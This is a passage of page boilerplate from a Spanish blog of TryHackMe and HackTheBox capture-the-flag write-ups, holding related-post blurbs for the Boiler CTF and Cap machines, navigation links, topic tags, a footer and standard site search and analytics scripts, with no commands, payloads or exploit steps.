class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Boiler CTF de la plataforma TryHackMe. Se trata de una máquina Linux de 64 bits, que posee una dificultad media de r...</p></div></div></a></div><div class="card"> <a href="/posts/cap-(hack-the-box)/"><div class="card-body"> <span class="timeago small" > 2 Oct 2021<i class="unloaded">2021-10-02T21:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cap (Hack The Box)</h3><div class="text-muted small"><p> En este documento se recogen los pasos a seguir para la resolución de la máquina Cap de la plataforma HackTheBox. Se trata de una máquina Linux de 64 bits, que posee una dificultad fácil de resoluc...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/tier-0-starting-point-machines-(hack-the-box)/" class="btn btn-outline-primary" prompt="Anterior"><p>Tier 0 Starting Point Machines (Hack The Box)</p></a> <a href="/posts/horizontall-(hack-the-box)/" class="btn btn-outline-primary" prompt="Siguiente"><p>Horizontall (Hack The Box)</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/J0lm3d0">J0lm3d0</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Etiquetas en tendencia</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/adb/">adb</a> <a class="post-tag" href="/tags/alwaysinstallelevated-privilege/">alwaysinstallelevated_privilege</a> <a class="post-tag" href="/tags/android/">android</a> <a class="post-tag" href="/tags/android-debugger-bridge/">android_debugger_bridge</a> <a class="post-tag" href="/tags/capabilities/">capabilities</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://j0lm3d0.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No se han encontrado resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
